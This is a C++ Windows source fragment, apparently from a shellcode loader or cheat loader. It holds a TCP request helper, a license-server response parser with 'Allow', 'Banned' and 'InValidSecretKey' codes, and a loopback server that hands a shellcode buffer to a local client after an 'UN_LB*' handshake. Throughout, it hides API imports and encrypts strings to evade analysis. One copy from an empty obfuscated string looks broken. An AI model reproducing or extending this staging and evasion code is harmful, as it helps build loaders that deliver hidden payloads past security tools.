__declspec(noinline) BOOL tcpRequest(CONST CHAR* serverAddress, INT port, CONST CHAR* message, CHAR** response, INT* length) {
    WSADATA wsaData;
    if (LI_FN(WSAStartup)(MAKEWORD(2, 2), &wsaData) != 0) return FALSE;

    LocalPtr<sockaddr_in*> serverAddr(sizeof(sockaddr_in));
    SOCKET sock = INVALID_SOCKET;
    BOOL result = FALSE;

    sock = LI_FN(socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        LI_FN(WSACleanup)();
        return FALSE;
    }

    (&serverAddr)->sin_family = AF_INET;
    (&serverAddr)->sin_port = LI_FN(htons)(port);

    if (LI_FN(inet_pton)(AF_INET, serverAddress, &(&serverAddr)->sin_addr) <= 0) {
        LI_FN(closesocket)(sock);
        LI_FN(WSACleanup)();
        return FALSE;
    }

    if (LI_FN(connect)(sock, (sockaddr*)&serverAddr, sizeof(sockaddr)) == SOCKET_ERROR) {
        LI_FN(closesocket)(sock);
        LI_FN(WSACleanup)();
        return FALSE;
    }

    INT messageLen = LI_FN(lstrlenA)(message);

    if (LI_FN(send)(sock, message, messageLen, 0) != messageLen) {
        LI_FN(closesocket)(sock);
        LI_FN(WSACleanup)();
        return FALSE;
    }

    *length = 0;
    *response = NULL;
    INT bufferSize = 1024;

    do {
        CHAR* buffer = (CHAR*)SecureAlloc(bufferSize);
        if (!buffer) {
            if (*response) {
                SecureFree(*response);
                *response = NULL;
                *length = 0;
            }
            LI_FN(closesocket)(sock);
            LI_FN(WSACleanup)();
            return FALSE;
        }
        INT bytesReceived = LI_FN(recv)(sock, buffer, bufferSize - 1, 0);
        if (bytesReceived > 0) {
            CHAR* newResponse = (CHAR*)SecureAlloc(*length + bytesReceived + 1);
            if (!newResponse) {
                SecureFree(buffer);
                if (*response) {
                    SecureFree(*response);
                    *response = NULL;
                    *length = 0;
                }
                LI_FN(closesocket)(sock);
                LI_FN(WSACleanup)();
                return FALSE;
            }
            if (*response != NULL) {
                __movsb((PBYTE)newResponse, (PBYTE)*response, (SIZE_T)*length);
                SecureFree(*response);
            }
            __movsb((PBYTE)newResponse + *length, (PBYTE)buffer, (SIZE_T)bytesReceived);
            *response = newResponse;
            *length += bytesReceived;
            (*response)[*length] = 0;
            result = TRUE;
        }
        SecureFree(buffer);
        if (bytesReceived <= 0) break;
    } while (TRUE);

    LI_FN(closesocket)(sock);
    LI_FN(WSACleanup)();

    return result;
}

__declspec(noinline) ULONG64 Verify_ParseResponse(CONST CHAR* response) {
    if (!LI_FN(lstrcmpA)(response, xorstr_("Allow"))) return StatusCode::Success;
    if (!LI_FN(lstrcmpA)(response, xorstr_("Banned"))) return StatusCode::UserBanned;
    if (!LI_FN(lstrcmpA)(response, xorstr_("InValidSecretKey"))) return StatusCode::InvalidSecretKey;
    if (!LI_FN(lstrcmpA)(response, xorstr_("DisAllow"))) return StatusCode::Disallowed;
    if (!LI_FN(lstrcmpA)(response, xorstr_("Internal"))) return StatusCode::ServerInternalError;
    if (!LI_FN(lstrcmpA)(response, xorstr_("MismatchParameter"))) return StatusCode::ParameterError;
    if (!LI_FN(lstrcmpA)(response, xorstr_("InvalidAPI"))) return StatusCode::InvalidResponse;
    if (!LI_FN(lstrcmpA)(response, xorstr_("Timeout"))) return StatusCode::Timeout;
    if (!LI_FN(lstrcmpA)(response, xorstr_("InvalidFileType"))) return StatusCode::InvalidFileType;
    if (!LI_FN(lstrcmpA)(response, xorstr_("FileNotAvailable"))) return StatusCode::FileNotAvailable;
    if (!LI_FN(lstrcmpA)(response, xorstr_("ServerError"))) return StatusCode::ServerError;
    return StatusCode::InvalidResponse;
}

__declspec(noinline) DWORD WINAPI ServeShellcodeLoopback(LPVOID Parameter) {
    CHAR* Shellcode = (CHAR*)((ULONG_PTR*)Parameter)[0];
    INT ShellcodeSize = (INT)((ULONG_PTR*)Parameter)[1];
    USHORT Port = (USHORT)((ULONG_PTR*)Parameter)[2];

    WSADATA wsaData;
    if (LI_FN(WSAStartup)(MAKEWORD(2, 2), &wsaData) != 0) return StatusCode::LoopbackServerFailed;

    SOCKET srv = LI_FN(socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (srv == INVALID_SOCKET) {
        LI_FN(WSACleanup)();
        return StatusCode::LoopbackServerFailed;
    }

    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.S_un.S_addr = 0x0100007F;
    addr.sin_port = LI_FN(htons)(Port);

    if (LI_FN(bind)(srv, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        LI_FN(closesocket)(srv); LI_FN(WSACleanup)();
        return StatusCode::LoopbackServerFailed;
    }

    if (LI_FN(listen)(srv, 1) == SOCKET_ERROR) {
        LI_FN(closesocket)(srv); LI_FN(WSACleanup)();
        return StatusCode::LoopbackServerFailed;
    }

    fd_set fds;
    FD_ZERO(&fds);
    FD_SET(srv, &fds);
    timeval tv{ 60, 0 };
    if (LI_FN(select)(0, &fds, nullptr, nullptr, &tv) <= 0) {
        LI_FN(closesocket)(srv); LI_FN(WSACleanup)();
        return StatusCode::LoopbackTimeout;
    }

    SOCKET cli = LI_FN(accept)(srv, nullptr, nullptr);
    if (cli == INVALID_SOCKET) {
        LI_FN(closesocket)(srv); LI_FN(WSACleanup)();
        return StatusCode::LoopbackAcceptFailed;
    }

    CHAR hs[64];
    __stosb((PUCHAR)hs, 0, sizeof(hs));
    INT totalRecv = 0;
    while (totalRecv < 14) {
        INT n = LI_FN(recv)(cli, hs + totalRecv, 14 - totalRecv, 0);
        if (n <= 0) break;
        totalRecv += n;
    }
    if (totalRecv != 14 || LI_FN(RtlCompareMemory)(hs, xorstr_("UN_LB*"), 6) != 6) {
        LI_FN(closesocket)(cli);
        LI_FN(closesocket)(srv);
        LI_FN(WSACleanup)();
        return StatusCode::LoopbackHandshakeFailed;
    }

    INT respSize = 8 + 8 + ShellcodeSize;
    CHAR* resp = (CHAR*)SecureAlloc(respSize);
    if (!resp) {
        LI_FN(closesocket)(cli);
        LI_FN(closesocket)(srv);
        LI_FN(WSACleanup)();
        return StatusCode::LoopbackAllocFailed;
    }

    __movsb((PBYTE)resp, (PBYTE)xorstr_(""), 8);
    __movsb((PBYTE)(resp + 8), (PBYTE)(hs + 6), 8);
    __movsb((PBYTE)(resp + 16), (PBYTE)Shellcode, ShellcodeSize);

    INT totalSent = 0;
    while (totalSent < respSize) {
        INT n = LI_FN(send)(cli, resp + totalSent, respSize - totalSent, 0);
        if (n == SOCKET_ERROR) break;
        totalSent += n;
    }

    SecureFree(resp);
    LI_FN(closesocket)(cli);
    LI_FN(closesocket)(srv);
    LI_FN(WSACleanup)();

    return (totalSent == respSize) ? StatusCode::Success : StatusCode::LoopbackSendFailed;
}